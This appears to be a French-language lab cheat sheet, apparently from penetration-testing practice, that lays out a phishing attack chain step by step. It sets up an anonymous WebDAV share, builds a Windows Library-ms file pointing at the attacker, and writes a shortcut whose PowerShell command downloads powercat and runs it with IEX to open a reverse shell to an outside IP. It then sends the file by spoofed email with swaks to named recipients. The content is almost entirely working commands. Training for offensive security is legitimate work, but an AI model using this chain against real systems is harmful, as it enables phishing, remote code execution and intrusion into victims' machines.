
# Swaks

1. WebDAV Share
```
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav
```

2. Sur machine Windows : créer config.Library-ms
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<KALI_MACHINE></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

3. Créer un shortcut sur windows puis le trasnférer sur kali (webdav) install.lnk
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.222:8000/powercat.ps1'); powercat -c 192.168.45.222 -p 4444 -e powershell"
```

4. Server python port 8000 avec powercat.exe dans dossier
5. `nc -lnvp 4444`
6.  Créer body.txt dans beyond

7. Envoyer le mail
```
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt - -header "Subject: Staging Script" --suppress-data -ap
```